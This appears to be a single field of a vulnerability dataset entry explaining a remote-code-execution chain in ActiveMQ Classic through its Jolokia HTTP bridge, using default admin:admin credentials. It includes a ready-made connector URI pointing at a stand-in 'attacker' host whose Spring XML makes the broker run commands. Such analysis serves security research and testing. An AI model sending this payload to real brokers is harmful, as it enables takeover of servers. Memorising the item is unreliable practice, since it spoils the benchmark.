 "bug_semantics": "An authenticated HTTP client of ActiveMQ Classic's Jolokia JMX-HTTP bridge (POST /api/jolokia/, often admin:admin) can invoke exec on BrokerViewMBean.addNetworkConnector(String) or addConnector(String) because the shipped jolokia-access.xml allows operation=* on org.apache.activemq:*. Those JMX methods pass the attacker-controlled discovery URI straight into BrokerService with no scheme checks. A URI such as static:(vm://rce?brokerConfig=xbean:http://attacker/payload.xml) is parsed as a discovery/composite network connector whose component is the in-JVM vm transport. VMTransportFactory, when the named broker does not exist, reads brokerConfig and treats it as a broker factory URL; the xbean: scheme loads that URL with Spring ResourceXmlApplicationContext, which instantiates all singleton beans (ProcessBuilder.start / Runtime.exec / MethodInvokingFactoryBean) before BrokerService validates the resulting configuration. The result is RCE in the broker JVM. Native JMX would hit the same unvalidated BrokerView methods; Jolokia is the documented HTTP source.",
